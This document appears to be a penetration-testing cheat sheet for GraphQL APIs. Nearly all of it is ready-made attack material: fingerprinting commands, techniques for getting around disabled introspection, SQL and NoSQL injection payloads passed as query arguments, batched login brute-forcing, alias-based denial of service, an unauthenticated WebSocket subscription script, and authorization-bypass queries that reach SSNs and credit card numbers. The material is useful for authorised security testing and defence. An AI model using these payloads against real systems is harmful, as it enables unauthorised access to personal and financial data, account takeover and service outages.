# GraphQL Security Deep Reference

## Fingerprinting the Engine

```bash
# Error-based fingerprinting — send invalid query
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"query{__typename}"}'

# Error message reveals engine:
# "Did you mean" suggestions → Apollo (JS)
# "Cannot query field" → Graphene (Python) / gqlgen (Go)
# Stack trace with Java packages → graphql-java / Spring GraphQL

# graphw00f — automated engine detection
pip install graphw00f
graphw00f -t https://target.com/graphql
```

## Introspection Bypass Techniques

If introspection is disabled:
```graphql
# 1. Fragment-based type leak (Apollo bug — older versions)
query {
  __type(name: "Query") { fields { name } }
}

# 2. Field suggestion (Clairvoyance tool)
# Send typos and harvest "Did you mean X?" suggestions
query { usr { id } }   # might suggest "user"

# 3. Batch introspection
[
  {"query":"{ __schema { queryType { name } } }"},
  {"query":"{ __type(name:\"User\") { fields { name } } }"}
]

# Clairvoyance — dictionary-based introspection without it being enabled
pip install clairvoyance
clairvoyance https://target.com/graphql -w wordlist.txt
```

## GraphQL Injection

```graphql
# SQL injection via argument
query { users(search: "' OR 1=1--") { id email } }
query { product(id: "1 UNION SELECT username,password FROM users--") { name } }

# NoSQL injection via argument
query { users(filter: "{\"$where\": \"1==1\"}") { id } }

# SSTI in GraphQL response templates (rare)
query { user(name: "{{7*7}}") { greeting } }
```

## Dangerous Default Configurations

```graphql
# GraphQL Playground / GraphiQL exposed
GET https://target.com/graphql    (browser opens IDE)
GET https://target.com/graphiql
GET https://target.com/playground

# Disable in production — enables introspection + query history

# Batch query DoS / rate limit bypass
POST /graphql
[
  {"query": "mutation { login(user:\"admin\",pass:\"pass1\") { token } }"},
  {"query": "mutation { login(user:\"admin\",pass:\"pass2\") { token } }"},
  ... × 1000
]

# Alias-based DoS (query complexity)
query {
  a1: heavyField { data }
  a2: heavyField { data }
  a3: heavyField { data }
  ... × 100
}
```

## Subscription Security

```javascript
// WebSocket-based GraphQL subscriptions — test for:
// 1. Auth bypass on subscription
ws = new WebSocket("wss://target.com/graphql-ws");
ws.send(JSON.stringify({
  type: "connection_init",
  payload: {}  // no auth
}));
ws.send(JSON.stringify({
  id: "1",
  type: "start",
  payload: {
    query: "subscription { allMessages { content user { email } } }"
  }
}));

// 2. IDOR in subscriptions
// Subscribe to another user's events by modifying userId in query
```

## GraphQL Authorization Bypass

```graphql
# Nested object bypass — top-level auth but nested isn't checked
query {
  publicPost(id: "1") {
    author {
      email          # might be restricted
      privateData {  # definitely restricted
        ssn
        creditCards { number }
      }
    }
  }
}

# Type confusion — same ID, different type
query { node(id: "VXNlcjox") { ... on User { email } ... on Admin { secretKey } } }

# Mutation auth bypass
mutation {
  updateUser(id: "1338", data: { role: "admin" }) { id role }
}
```

## Tools Summary

| Tool | Purpose | Install |
|------|---------|---------|
| graphw00f | Engine fingerprint | `pip install graphw00f` |
| Clairvoyance | Introspection without introspection | `pip install clairvoyance` |
| InQL | Burp extension, auto-queries | Burp Suite BApp Store |
| GraphQL Voyager | Visualize schema | npm / online |
| Altair | GraphQL client with auth | Desktop app |
